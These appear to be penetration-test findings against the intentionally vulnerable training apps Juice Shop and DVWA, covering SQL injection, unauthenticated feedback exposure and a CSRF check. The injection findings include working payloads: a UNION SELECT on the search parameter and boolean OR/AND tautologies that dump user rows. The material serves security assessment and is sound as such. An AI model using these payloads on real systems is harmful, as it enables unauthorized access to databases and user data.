findings.title: Product search SQL injection (error-based and UNION-based) via q parameter
findings.response_evidence: (1) q=qwert' -> HTTP 500 text/html: "Error: SQLITE_ERROR: near \"'%'\": syntax error". (2) Benign baseline q=apple -> HTTP 200 JSON {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]} with no error. (3) q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 200 JSON {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}, showing attacker-chosen values reflected in the product columns. Quote produces a SQL error and UNION injection succeeds, versus the benign baseline.

findings.title: Unauthenticated access to user feedback with partially masked author emails
findings.response_evidence: HTTP 200 application/json {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,...},{"UserId":2,"id":2,"comment":"Great shop! Awesome service! (***@juice-sh.op)",...},...]}. 8 records returned without authentication. Fields: UserId, id, comment, rating, createdAt, updatedAt. No dedicated email field exists. Author emails appear only as partially masked strings embedded in the comment text (e.g. '***in@juice-sh.op'), and 'anonymous' entries have no author. The unauthenticated data exposure is real, but full author email addresses are not disclosed, so the CWE-359 criterion (disclosure of author email addresses) is only partially met. Verdict is inconclusive pending a judgment on whether partial masking counts.

findings.title: DVWA security.php: security-level change is token-protected (CSRF defense enforced); no CSRF vulnerability
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token=[REDACTED], page 'Security level is currently: high'
POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302 /security.php; GET -> 'Security level set to high', token rotated to a97f1eeff3c698928be3f674148ef1f2
POST http://dvwa/security.php security=low&seclev_submit=Submit (NO user_token) -> 302; GET /security.php -> 'Security level is currently: high', 'CSRF token is incorrect'
findings.response_evidence: Valid-token POST changed level (page body: 'Security level set to high'; 'Security level is currently: high'). Token-less POST attempting security=low did NOT change the level: follow-up GET shows 'Security level is currently: high' and the message 'CSRF token is incorrect'. The anti-CSRF token is enforced on /security.php, so the CWE-352 hypothesis is not supported. Note: session_info.security_level lagged and still reported 'low' throughout, so it is not reliable for level state; the page body is authoritative. Level-change effectiveness confirmed; no vulnerability.

findings.title: DVWA SQL Injection via session-input delivery path [security=high]: boolean TRUE returns multiple users, FALSE returns zero
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # via session-input, then GET /vulnerabilities/sqli/ returned 5 records with surnames: admin (First name admin), Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload 1' AND '1'='2' # via session-input, then GET /vulnerabilities/sqli/ returned zero 'ID:' records (only the page chrome and 'Click here to change your ID'). The trailing '#' comment is required and works at high. Page also contains 'CSRF token is incorrect' text in the TRUE response; data rows were still returned. Confirmed: TRUE returns multiple seeded surnames, FALSE returns zero.

findings.title: Unauthenticated /api/Feedbacks: no unmasked author email addresses disclosed
findings.response_evidence: Raw JSON (complete, unauthenticated) has 8 records with fields UserId, id, comment, rating, createdAt, updatedAt only; there is no email field and no author email in UserId (numeric IDs 1,2,3,21,null). The only email-like strings are masked in comments: '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'. Anonymous rows show '(anonymous)'. No full, unmasked email addresses are disclosed, so CWE-359 is not confirmed. Partial masking leaks fragments of the local part, which is a minor concern only.
